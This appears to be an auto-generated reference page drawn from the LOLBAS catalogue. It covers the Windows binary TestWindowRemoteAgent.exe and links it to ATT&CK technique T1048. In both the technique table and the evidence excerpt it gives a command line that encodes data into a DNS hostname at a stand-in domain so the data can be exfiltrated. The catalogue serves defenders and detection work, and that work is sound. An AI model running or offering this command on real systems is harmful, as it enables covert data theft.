---
parsed_by: focuslocust
source: lolbas
type: generated
---
# TestWindowRemoteAgent.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `testwindowremoteagent.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Testwindowremoteagent.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

TestWindowRemoteAgent.exe is the command-line tool to establish RPC

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/testwindowremoteagent.md)
- Source verification: [source record](../../sources/lolbas/testwindowremoteagent.exe.md)

## Aliases

- `TestWindowRemoteAgent.exe`
- `testwindowremoteagent.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1048 - Exfiltration Over Alternative Protocol](../../attack/techniques/T1048-exfiltration-over-alternative-protocol.md) | explicit | source | Command metadata lists T1048: TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000 |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/testwindowremoteagent.exe.md)

## Source Verification

[source record](../../sources/lolbas/testwindowremoteagent.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Person: Onat Uzunyayla
Author: Onat Uzunyayla
Commands:
- Category: Upload
Command: TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000
Description: Sends DNS query for open connection to any host, enabling exfiltration over DNS
MitreID: T1048
```
